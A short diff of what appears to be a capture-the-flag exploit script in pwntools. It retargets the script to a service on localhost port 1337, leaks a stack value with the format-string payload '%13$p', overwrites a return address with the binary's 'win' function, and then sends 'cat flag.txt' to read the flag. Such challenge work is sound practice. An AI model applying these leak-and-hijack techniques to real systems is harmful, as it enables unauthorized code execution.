@@ -14,7 +14,8 @@ c
 """
 
 # io = gdb.debug(path, gdbscript=gdbscript)
-io = process(path)
+# io = process(path)
+io = remote("localhost", 1337)
 
 payload = b"%13$p"
 io.sendlineafter(b"Username:", payload)
@@ -34,7 +35,7 @@ payload += p64(exe.symbols['win'])
 io.sendlineafter(b"already.", payload)
 
 io.recvuntil(b"?!\n")
-io.sendline(b"cat chall/flag.txt")
+io.sendline(b"cat flag.txt")
 success(f"Flag: {io.recvline().strip().decode()}")
 io.close()
 # io.interactive()
